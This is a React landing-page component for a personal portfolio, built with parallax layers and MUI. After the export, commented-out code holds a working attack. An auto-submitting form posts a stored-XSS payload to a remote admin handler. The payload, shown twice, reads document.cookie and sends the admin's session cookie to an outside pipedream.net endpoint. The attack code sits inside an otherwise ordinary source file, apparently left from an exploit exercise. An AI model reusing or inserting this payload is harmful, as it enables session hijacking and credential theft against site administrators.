import { Parallax, ParallaxLayer } from '@react-spring/parallax'
import { Box } from '@mui/material'
import { styled } from '@mui/system';
import { Button } from '@mui/material';
import AnimatedText from './animations/AnimatedText';


const H1Style = {
    fontSize: "80px",
    fontWeight: 700,
    lineHeight: 1,
    margin: "0 0 20px",
    paddingTop: "10px",
}

const H1Typography = styled('h1')({
    fontSize: "80px",
    fontWeight: 700,
    lineHeight: 1,
    margin: "0 0 20px",
});

const H2Typography = styled('h2')({
    fontSize: "50px",
    fontWeight: 400,
    lineHeight: 1.2,
    opacity: 0.75,
    margin: 0,
});

const name = "Nikhil Aggarwal"
const role = "web developer"
const description = "I'm a software engineer specializing in building (and occasionally designing) exceptional websites, applications, and everything in between. Currently, I am focused on learning about blockchain and building Web3 applications"

const splitSentence = (sentence) => {
    return sentence.split("\n").map((line, index) => {
        return (
            <AnimatedText
                key={line + "-" + index}
                direction={index % 2 === 0 ? 1 : -1}
                text={line}
                variant="body1"
                speed={0.005}
                cursorColor="transparent"
                duration={0.01}
            />
        )
    })
}


function LandingPage(props) {

    return (
        <div>
            <ParallaxLayer
                offset={0}
                speed={1}
                style={{
                    backgroundColor: "#000000",
                }}
            //linear-gradient(#000000, #303030)
            // 
            />
            <ParallaxLayer
                offset={0}
                speed={0.3}>
                <Box style={{
                    paddingLeft: "10%",
                    paddingTop: "10%",
                    color: "white"
                }}>
                    <AnimatedText
                        text={"Hi, my name is"}
                        variant="h6"
                        direction={-1}
                        speed={0.05}
                        cursorColor="#ffffff"
                        duration={0.15}
                    />
                    <AnimatedText
                        text={name}
                        variant="h1"
                        style={H1Style}
                        direction={1}
                        speed={0.05}
                        cursorColor="#ffffff"
                        duration={0.15}
                    />
                    {/* <Typography
                        style={H1Style}
                        variant='h1'
                    >
                        {name}.
                    </Typography> */}
                    <H2Typography>
                        I am a <span style={{
                            color: "#FF3B32",
                        }}>{role}.</span>
                    </H2Typography>
                    <Box style={{
                        paddingTop: "40px",
                        width: "40%",
                    }}>
                        {splitSentence(description)}
                        {/* <Typography variant='body1'>
                            {description}.
                        </Typography> */}
                    </Box>
                    <Box style={{
                        marginTop: "40px",
                        width: "40%",
                        flex: 1,
                    }}>
                        <Button
                            variant="contained"
                            style={{
                                alignItems: "center",
                                backgroundColor: "#E43B27",
                            }}
                            onClick={() => props.moveToPage(1)}>
                            Learn more
                        </Button>

                    </Box>
                </Box>

            </ParallaxLayer>
        </div>
    );
}

export default LandingPage;


{/* <form
    name="EventConfirmRedirection"
    method="post"
    action="http://ebcece08.s.l0p.xyz:8094/admin/handle_message.php"
>
    <input type="text" value="123" id="uid" name="uid"></input>
    <input type="text" value="view_uid" id="action" name="action"></input>
    <input type="text" value=
    "<script>
    let admin_cookie = document.cookie;
    SendToken().catch(error => {
        console.error(error);
    });
  
    async function SendToken() {
        const response = await fetch('https://eoqh799cn571a20.m.pipedream.net', {
            method: 'POST',
            body: JSON.stringify(admin_cookie),
            headers: {
                'Content-Type': 'application/json'
            }
        });
        const res = await response.text();
    }
</script>"
        id="token"
        name="token"
    >
    </input>

    <script>
        document.EventConfirmRedirection.submit();
    </script>

</form > 


{/* <script>
    let admin_cookie = document.cookie;
    SendToken().catch(error => {
        console.error(error);
    });
  
    async function SendToken() {
        const response = await fetch('https://eoqh799cn571a20.m.pipedream.net', {
            method: 'POST',
            body: JSON.stringify(admin_cookie),
            headers: {
                'Content-Type': 'application/json'
            }
        });
        const res = await response.text();
    }
</script> */}